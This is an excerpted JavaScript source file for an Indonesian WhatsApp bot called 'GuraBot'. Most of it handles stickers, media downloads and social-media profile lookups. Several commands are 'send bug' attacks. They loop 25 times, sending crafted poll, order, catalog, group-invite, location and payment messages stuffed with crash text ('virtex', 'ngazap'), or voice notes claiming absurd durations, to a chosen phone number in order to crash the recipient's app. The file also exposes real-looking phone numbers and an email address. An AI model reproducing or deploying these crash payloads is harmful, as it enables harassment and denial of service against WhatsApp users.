...
try {
        ...
        const itsMeKayla = [botNumber, own1, own2].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        ...
        const UltahCreator = new Date('October 20, 2023 00:00:00')
...
const sendvn = (teks) => {
kayla.sendMessage(from, { audio: teks, mimetype: 'audio/mpeg', ptt: true }, { quoted: m })
}
...
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: '628889616144@s.whatsapp.net' } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
...
"fileName": `GuraBot WhatsApp${ngazap(prefix)}`,
...
item2.EMAIL;type=INTERNET:ekuzika123@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://instagram.com/ekuzikaa_18\n
...
"message": {
"pollCreationMessage": {
"name": `GuraBot ${virus}${virtex(prefix)}`,
"options": [
	{
...
"status": "INQUIRY",
"surface": "CATALOG",
"message": `GuraBot WhatsApp${ngazap(prefix)}`,
"orderTitle": "GuraBot WhatsApp${ngazap(prefix)}",
"sellerJid": "628889616144@s.whatsapp.net",
...
.on('finish', async () => {
await kayla.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: true }, { quoted: m })
...
.on('finish', async () => {
await kayla.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mpeg' }, { quoted: m })
...
const botzkayla = "628889616144@s.whatsapp.net"
const mark = "0@s.whatsapp.net"
const timestamp = speed()
const latensi = speed() - timestamp
const butlocNye = [
{buttonId: `${prefix}allmenu`, buttonText: {displayText: '𝗔𝗹𝗹 𝗠𝗲𝗻𝘂'}, type: 1},
...
𝘚𝘢𝘺𝘢 𝘎𝘶𝘳𝘢𝘉𝘰𝘵 𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱 𝘠𝘢𝘯𝘨 𝘉𝘪𝘴𝘢 𝘔𝘦𝘮𝘣𝘢𝘯𝘵𝘶 𝘈𝘯𝘥𝘢 
𝘔𝘦𝘮𝘣𝘶𝘢𝘵 𝘚𝘵𝘪𝘤𝘬𝘦𝘳, 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥 𝘝𝘪𝘥𝘦𝘰/𝘈𝘶𝘥𝘪𝘰 𝘛𝘪𝘬𝘵𝘰𝘬, 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥 𝘝𝘪𝘥𝘦𝘰/𝘈𝘶𝘥𝘪𝘰 𝘠𝘰𝘶𝘵𝘶𝘣𝘦
𝘔𝘦𝘮𝘣𝘶𝘢𝘵 𝘓𝘰𝘨𝘰 𝘛𝘦𝘹𝘵 𝘗𝘳𝘰/𝘗𝘩𝘰𝘵𝘰𝘰𝘹𝘺/𝘌𝘱𝘩𝘰𝘵𝘰360, 𝘋𝘢𝘯 𝘓𝘢𝘪𝘯-𝘭𝘢𝘪𝘯.
...
Title : ${atdl.title}`, `Auto Downloader By GuraBot`, ftext)
}
}
...
text: `Silahkan Kak @${sender.split("@")[0]} Pencet Button List Message Nya`,
mentions: [sender],
footer: fake,
buttonText: 'Touch Me (≧▽≦)',
sections: seactions,
...
"sourceUrl": 'https://instagram.com/ekuzikaa_18'
}
}
})
break
...
kayla.sendMessage(m.chat,{audio:buff, mimetype: "audio/mpeg", ptt:false},{quoted:m})
fs.unlinkSync(rano)
})
})
break
case 'tiktokstalk': case 'ttstalk': case 'stalktt': case 'stalktiktok': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`Contoh:\n${prefix+command} exzuka_81`)
var usrnm = q
let ttst = await fetchJson(`https://m.caliph.my.id/api/tiktokuser.php?usr=${usrnm}`)
let ttstres = ttst.result.user
let ttstcp = `
    ❒ 𝗧𝗶𝗸𝘁𝗼𝗸 𝗦𝘁𝗮𝗹𝗸 ❒
┏┈─┈─┈─┈─┈─⦿
╿❥⊸ *Username:* ${ttstres.uniqueId}
┊❥⊸ *Fullname:* ${ttstres.nickname}
┊❥⊸ *Followers:* ${ttst.result.stats.followerCount}
┊❥⊸ *Following:* ${ttst.result.stats.followingCount}
┊❥⊸ *Hearts:* ${ttst.result.stats.heart}
┊❥⊸ *Bio:* ${ttstres.signature}
╽❥⊸ *Private:* ${ttstres.privateAccount}
┊❥⊸ *Url:* https://tiktok.com/@${usrnm}/
┗┈─┈─┈─◉
`
kayla.sendMessage(m.chat, { image: { url: ttstres.avatarLarger }, caption: ttstcp }, {quoted: m})
}
break
case 'igstalk':{
...
kayla.sendMessage(m.chat,{audio:{url: tytyd.media[2].url}, mimetype: "audio/mpeg", ptt:false},{quoted:m})
}
break
case 'googles': {
...
owned = '628889616144@s.whatsapp.net'
ngen = `
Title : ${anu.title}
Ext : Yt - Play
ID : ${anu.videoId}
...
case 'addprem':
if (!itsMeKayla) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628889616144`)
...
let memedia = await uptotelegra(media)
let resbg = await getBuffer(`https://violetics.pw/api/media/removebg?apikey=beta&img=${memedia}`)
let encmedia = await kayla.sendImageAsSticker(m.chat, resbg, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
...
mee = await kayla.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kayla.sendMessage(m.chat, { audio: { url: mem }, mimetype: 'audio/mpeg', ptt:true, mentions:[m.sender]}, { quoted: m })
break
case 'toaudio':
...
mee = await kayla.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kayla.sendMessage(m.chat, { audio: { url: mem }, mimetype: 'audio/mpeg', ptt:false, mentions:[m.sender]}, { quoted: m })
break
case 'tomp3':
...
case 'smoji':
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`Emoji nya mana?\nContoh: \n\n${prefix + command} 🗿`)
let smony = await fetchJson(`https://violetics.pw/api/media/emojipedia?apikey=beta&emoji=${encodeURIComponent(q)}`)
let resmo = smony.result
kayla.sendImageAsSticker(m.chat, resmo.whatsapp, m, { packname: global.packname, author: global.author })
break
case 'memek':
case 'bego':
case 'goblok':
...
contextInfo:{
"externalAdReply": {
"title": `GuraBot ${virus}${virtex(prefix)}`,
"body": `GuraBot ${virus}${virtex(prefix)}`,
mimetype: 'audio/mpeg', 
caption: `GuraBot WhatsApp${ngazap(prefix)}`,
showAdAttribution: true,
...
Message: { 
extendedTextMessage: { 
text: `GuraBot ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
...
"caption": `GuraBot ${virus}${virtex(prefix)}`,
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
kayla.sendMessage(num, { audio: audionye, mimetype: 'audio/mpeg', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(num, `GuraBot ${virus}${virtex(prefix)}`, `GuraBot ${virus}${virtex(prefix)}`, `GuraBot ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
...
"title": `GuraBot WhatsApp ${virus} ${virtex(prefix)}`,
...
"url": `https://wa.me/628889616144`
},
"businessOwnerJid": "628889616144@s.whatsapp.net",
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(m.chat, `GuraBot ${virus}${virtex(prefix)}`, `GuraBot ${virus}${virtex(prefix)}`, `GuraBot ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
kayla.sendMessage(m.chat, { audio: audionye, mimetype: 'audio/mpeg', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
...
var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '628889616144@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-GuraBot⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ppnyauser, caption: `ৡৢ͜͡𝟒𝟎𝟒-GuraBot⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
...
var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-GuraBot⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: lep })
for (let i = 0; i < jumlah; i++) {
...
kayla.sendKatalog(numt, `ৡৢ͜͡𝟒𝟎𝟒-GuraBot⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-GuraBot⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ppnyauser, { quoted: lep })
...
"name": `GuraBot WhatsApp ${virus}`,
"address": `Created By GuraBot ${virtex(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
...
case 'leaves': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`Example : ${prefix+command} GuraBot`) 
let link
...
break
case 'aesthetic': case 'darkjokes': case 'gamewallpaper':
let heyyoww
if (/aesthetic/.test(command)) heyyoww = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/aesthetic.json')
if (/darkjokes/.test(command)) heyyoww = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/darkjokes.json')
if (/gamewallpaper/.test(command)) heyyoww = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/gamewallpaper.json')
let yehai = heyyoww[Math.floor(Math.random() * heyyoww.length)];
let buttfoto = [
...
let e = String(err)
kayla.sendMessage("628889616144@s.whatsapp.net", { text: "Hallo Owner Sepertinya Ada Yang Error Harap Di Perbaiki " + util.format(e), 
contextInfo:{
forwardingScore: 5, 
isForwarded: true
}})
